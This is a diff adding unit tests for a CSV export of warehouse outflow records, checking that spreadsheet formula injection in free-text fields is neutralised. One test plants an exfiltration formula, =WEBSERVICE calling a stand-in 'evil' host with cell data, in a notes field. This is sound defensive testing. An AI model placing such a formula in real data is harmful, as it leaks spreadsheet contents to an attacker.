@@ -49,4 +49,39 @@ describe("exportación de salidas", () => {
     expect(buildSalidasCsv([movement("4900123456")])).toContain('"Documento Material"');
     expect(buildSalidasCsv([movement("4900123456")])).toContain('"4900123456"');
   });
+
+  /**
+   * RL-A-03 de punta a punta: el operador escribe la fórmula en un campo de
+   * texto libre del movimiento y el administrativo abre el reporte exportado.
+   */
+  it("una nota con fórmula sale neutralizada del export real", () => {
+    const m = movement("4900123456");
+    m.notes = '=WEBSERVICE("http://evil/?d="&A1)';
+
+    const csv = buildSalidasCsv([m]);
+
+    expect(csv).toContain(`"'=WEBSERVICE(""http://evil/?d=""&A1)"`);
+    expect(csv).not.toContain(`"=WEBSERVICE`);
+  });
+
+  it("el destino y el chofer pasan por el mismo filtro", () => {
+    const m = movement("4900123456");
+    m.destination = "=1+1";
+    m.driver = "@SUM(A1:A9)";
+
+    const csv = buildSalidasCsv([m]);
+
+    expect(csv).toContain(`"'=1+1"`);
+    expect(csv).toContain(`"'@SUM(A1:A9)"`);
+  });
+
+  it("las cantidades y los campos vacíos siguen saliendo como números y guiones", () => {
+    // La protección no debe convertir la planilla en texto: si esto se rompe,
+    // los totales de Excel dejan de funcionar y nadie usa más el export.
+    const csv = buildSalidasCsv([movement(null)]);
+
+    expect(csv).toContain('"10"');
+    expect(csv).toContain('"-"');
+    expect(csv).not.toContain(`"'`);
+  });
 });
